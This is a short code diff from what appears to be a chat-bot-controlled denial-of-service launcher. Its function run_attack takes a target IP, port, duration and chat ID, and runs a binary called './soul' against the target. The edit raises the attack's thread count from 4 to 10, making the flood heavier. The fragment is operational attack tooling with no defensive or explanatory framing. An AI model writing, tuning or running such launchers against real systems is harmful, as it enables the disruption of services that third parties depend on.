@@ -69,7 +69,7 @@ def run_attack(target_ip, target_port, duration, chat_id):
         os.sched_setaffinity(pid, range(8))  # Restrict to CPUs 0-7
 
         # Get the number of threads (you can either hardcode it or calculate dynamically)
-        num_threads = 4  # Change this to the desired value
+        num_threads = 10  # Change this to the desired value
 
         # Prepare the attack command, passing the 4 required arguments
         attack_command = ['./soul', target_ip, str(target_port), str(duration), str(num_threads)]
